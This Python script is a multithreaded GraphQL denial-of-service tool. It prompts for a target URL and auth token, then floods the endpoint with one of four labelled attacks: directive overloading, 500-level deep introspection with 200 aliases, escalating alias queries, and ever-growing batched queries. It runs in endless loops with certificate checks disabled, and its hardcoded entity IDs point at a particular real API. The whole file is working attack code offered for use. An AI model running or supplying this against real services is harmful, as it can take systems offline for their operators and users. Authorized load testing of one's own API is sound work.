import sys
import requests
import time
import threading
import random
import urllib3

urllib3.disable_warnings(category=urllib3.exceptions.InsecureRequestWarning)

# Function to get multi-line headers input
def get_headers_input():
    """
    Get headers from the user input with intelligent defaults for necessary headers.
    The user can either provide just the token or paste all the required headers in a multi-line environment.
    """
    default_headers = {
        "Content-Type": "application/json",  
        "Accept": "application/json",         
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36", 
        "Accept-Encoding": "gzip, deflate, br",  
    }
    
    header_input_method = input("Would you like to enter just the token (1) or paste all headers (2)? Enter 1 or 2: ").strip()
    
    headers = default_headers.copy()

    if header_input_method == "1":
        token = input("Enter your Authorization token (without 'Bearer '): ").strip()
        headers["Authorization"] = f"Bearer {token}"

    elif header_input_method == "2":
        print("Enter headers (multi-line input). Press Enter twice to finish.")
        print("If you don't provide a header, it will use the default value.")
        
        while True:
            line = input()
            if line.strip() == "":  # Break when user presses Enter twice
                break
            try:
                # Ensure header is in 'Key: Value' format
                key, value = line.split(":", 1)
                headers[key.strip()] = value.strip()  
            except ValueError:
                print("Invalid header format. Please use 'Key: Value' format.")
                continue
    
    else:
        print("Invalid option. Default headers will be applied.")
    
    return headers



# Base class for a GraphQL DoS test
class GraphQLDoSTest:
    def __init__(self, url, headers, num_threads, request_delay):
        self.url = url
        self.headers = headers
        self.num_threads = num_threads
        self.request_delay = request_delay

    def run(self):
        raise NotImplementedError("Subclasses should implement this method.")

# Directive Overloading Test
class DirectiveOverloadingTest(GraphQLDoSTest):
    def __init__(self, url, headers, num_threads, request_delay):
        super().__init__(url, headers, num_threads, request_delay)
        self.query_repeat_count = 5
        self.available_directives = [
            '@include(if: true)',
            '@skip(if: false)'
        ]

    def build_directives_string(self, count):
        random.shuffle(self.available_directives)
        chosen = self.available_directives[:min(count, len(self.available_directives))]
        return " ".join(chosen)

    def build_directive_overload_query(self):
        segments = []
        for i in range(1, self.query_repeat_count + 1):
            directive_str = self.build_directives_string(count=10)
            search_segment = f"""
              entitySearch{i}: entitySearch(filter: {{ 
                page: {i}, 
                pageSize: 5, 
                limit: 0,
                ids: ["someID"],
                relationTypes: ["famil"]
              }}) {directive_str} {{
                id
                entityType
                backward
                from
                to
                properties {{
                  key
                  value
                }}
              }}
            """
            type_segment = f"""
              entityTypeSearch{i}: entityTypeSearch(filter: {{
                text: "Test"
                limit: 5
              }}) {directive_str} {{
                id
                entityType
                from
                to
              }}
            """
            relation_segment = f"""
              relation{i}: relation(filter: {{
                from: "SomeNode"
              }}) {directive_str} {{
                from
                to
                relationType
                backward
                properties {{
                  key
                  value
                }}
              }}
            """
            segments.extend([search_segment.strip(), type_segment.strip(), relation_segment.strip()])

        query_body = "\n".join(segments)
        query = f"""
        query DirectiveAttack {{
           {query_body}
        }}
        """
        return query.strip()

    def worker(self, thread_id):
        while True:
            try:
                query = self.build_directive_overload_query()
                print(f"[Thread {thread_id}] Sending directive overload query...")
                response = requests.post(self.url, headers=self.headers, data=query, verify=False)
                print(f"[Thread {thread_id}] Status Code: {response.status_code}")
                print(f"[Thread {thread_id}] Response snippet: {response.text[:200]}...\n")
            except Exception as e:
                print(f"[Thread {thread_id}] Exception: {str(e)}")
                break
            time.sleep(self.request_delay)

    def run(self):
        threads = []
        for t_id in range(self.num_threads):
            t = threading.Thread(target=self.worker, args=(t_id,), name=f"directive-overload-{t_id}")
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

# Deep Introspection Test
class DeepIntrospectionTest(GraphQLDoSTest):
    def __init__(self, url, headers, num_threads, request_delay):
        super().__init__(url, headers, num_threads, request_delay)
        self.query_depth = 500
        self.batch_aliases = 200

    def build_deep_introspection_fragment(self, depth):
        fragment = "name"
        for _ in range(depth):
            fragment = f"""
            name
            fields {{
              name
              type {{
                name
                fields {{
                  {fragment}
                }}
              }}
            }}
            """
        return f"""
          __schema {{
            types {{
              {fragment}
            }}
          }}
        """

    def build_introspection_query(self):
        core = self.build_deep_introspection_fragment(self.query_depth)
        aliases = []
        for i in range(1, self.batch_aliases + 1):
            aliases.append(f"alias{i}: {core}")
        return "query {\n" + "\n".join(aliases) + "\n}"

    def worker(self):
        while True:
            try:
                query = self.build_introspection_query()
                response = requests.post(self.url, headers=self.headers, data=query, verify=False)
                print(f"[{threading.current_thread().name}] Status: {response.status_code}")
                time.sleep(0.5)
            except Exception as ex:
                print(f"[{threading.current_thread().name}] Error: {ex}")
                break

    def run(self):
        threads = []
        for i in range(self.num_threads):
            t = threading.Thread(target=self.worker, name=f"Thread-{i}")
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

# Cyclic Query Attack Test
class CyclicQueryAttackTest(GraphQLDoSTest):
    def __init__(self, url, headers, num_threads, request_delay):
        super().__init__(url, headers, num_threads, request_delay)
        self.max_depth = 0

    def create_cyclic_query(self, max_depth):
        query = "{\n"
        for depth in range(max_depth):
            query += f"""
            level{depth}: entitySearch(filter: {{
                ids: ["7162742664083972096"],
                relationTypes: ["famil"],
                excludeEntityTypes: ["undefined"],
                page: {depth + 1},
                pageSize: 7,
                limit: 0
            }}) {{
                id
                entityType
                properties {{
                    key
                    value
                }}
            }}
            """
        query += "}"
        return query

    def run(self):
        while True:
            try:
                print(f"Sending request with cyclic depth of {self.max_depth}...")
                graphql_query = self.create_cyclic_query(self.max_depth)
                payload = {"query": graphql_query}
                response = requests.post(self.url, headers=self.headers, json=payload, verify=False)
                print(f"Status Code: {response.status_code}")
                if response.status_code == 200:
                    print(f"Response: {response.text[:500]}")
                else:
                    print(f"Error Response: {response.text}")
                self.max_depth += 1
                time.sleep(1)
            except KeyboardInterrupt:
                print("Script interrupted. Exiting...")
                break

# Batching Attack Test
class BatchingAttackTest(GraphQLDoSTest):
    def __init__(self, url, headers, num_threads, request_delay):
        super().__init__(url, headers, num_threads, request_delay)
        self.batch_size = 100

    def create_query(self, batch_count):
        queries = []
        for i in range(1, batch_count + 1):
            queries.append(f"""
            batch{i}: entitySearch(filter: {{ ids: ["7162742664083972096"], relationTypes: ["famil"], excludeEntityTypes: ["undefined"], page: {i}, pageSize: 7, limit: 0 }}) {{
                id
                entityType
                backward
                from
                to
                properties {{
                    key
                    value
                }}
            }}
            """)
        return "query {" + "\n".join(queries) + "}"

    def run(self):
        while True:
            try:
                print(f"Sending request with {self.batch_size} batches...")
                query = self.create_query(self.batch_size)
                response = requests.post(self.url, headers=self.headers, data=query, verify=False)
                print(f"Status Code: {response.status_code}")
                if response.status_code == 200:
                    print(f"Response: {response.text[:500]}")
                else:
                    print(f"Error Response: {response.text}")
                self.batch_size += 100
                time.sleep(1)
            except KeyboardInterrupt:
                print("Script interrupted. Exiting...")
                break

# Function to choose and run a test
def run_test(test_choice, url, headers, num_threads, request_delay):
    test_classes = {
        1: DirectiveOverloadingTest,
        2: DeepIntrospectionTest,
        3: CyclicQueryAttackTest,
        4: BatchingAttackTest,
    }

    test_class = test_classes.get(test_choice)
    if test_class:
        test_instance = test_class(url, headers, num_threads, request_delay)
        test_instance.run()
    else:
        print("Invalid choice. Exiting.")

# Main program entry
def main():
    url = input("Enter GraphQL URL (for example: https://api.example.com/graphql): ")
    headers = get_headers_input()

    print("\nSelect the attack type:")
    print("1. Directive Overloading")
    print("2. Deep Introspection Query")
    print("3. Cyclic Query Attack")
    print("4. Batching Attack")

    test_choice = int(input("Enter the number of the test type: "))
    num_threads = int(input("Enter number of threads (default 10): ") or 10)
    request_delay = float(input("Enter request delay (seconds, default 0.0): ") or 0.0)

    print(f"Running test with {num_threads} threads and a {request_delay} second delay.")
    run_test(test_choice, url, headers, num_threads, request_delay)

if __name__ == "__main__":
    main()
